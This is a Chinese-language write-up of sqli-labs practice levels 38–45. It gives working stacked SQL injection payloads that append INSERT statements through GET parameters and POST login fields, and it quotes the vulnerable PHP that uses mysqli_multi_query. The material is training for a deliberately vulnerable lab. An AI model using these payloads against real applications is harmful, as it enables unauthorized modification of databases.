# sqli-labs靶场(6)堆叠注入


sqli-labs靶场精简记录38-45

<!--more-->

### Less-38 GET- Stacked Query Injection - String

基于错误 GET 单引号字符型堆叠注入

vul

```
if (mysqli_multi_query($con1, $sql))
{
    
    ...
```



因为存在mysqli_multi_query函数，该函数支持多条sql语句同时进行。

使用分号，来执行两条命令

插入新数据

```
1';insert into users(id,username,password) values(38,'test','1')--+
```

### Less-39 GET -  Stacked Query Injection - Intiger 

基于错误 GET 数字型堆叠注入

```
?id=1;insert into users(id,username,password) values(39,'less39','test')--+
```

### Less-40  GET - BLIND based - String - Stacked

基于布尔 GET 单引号小括号字符型盲注堆叠注入

bypass

```
?id=1');insert into users values(40,'Less40','hello')--+
```

关闭了报错，但是可以根据页面是否有内容来判断，语句是否正确

### Less-41 GET - BLIND based - Intiger - Stacked

基于布尔 GET 数字型盲注堆叠注入

bypass

```
?id=1;insert into users values(41,'Less41','hello')--+
```

### Less-42 - POST - Error based - String - Stacked

基于存储 POST 单引号字符型堆叠注入

```
   $username = mysqli_real_escape_string($con1, $_POST["login_user"]);
   $password = $_POST["login_password"];
```

post发包

```
login_user=1&login_password=1';insert into users(id,username,password) values ('39','less30','123456')--+&mysubmit=Login
```

### less43 POST -Error based -String -Stacked with tiwst

POST型基于错误的堆叠变形字符型注入

bypass

```
1');insert into users values(43,'Less43','Less43')#
```

### Less-44 - POST - Error based - String - Stacked -Blind

基于存储 POST 单引号字符型盲注堆叠注入

bypass

```
1';insert into users values ('44','less44','hello')#
```

### less-45 POST - Error based - String - Stacked - Blind

基于存储 POST 单引号小括号字符型盲注堆叠注入

bypass

```
1');insert into users(id,username,password) values(45,'Less45','Less45')#
```


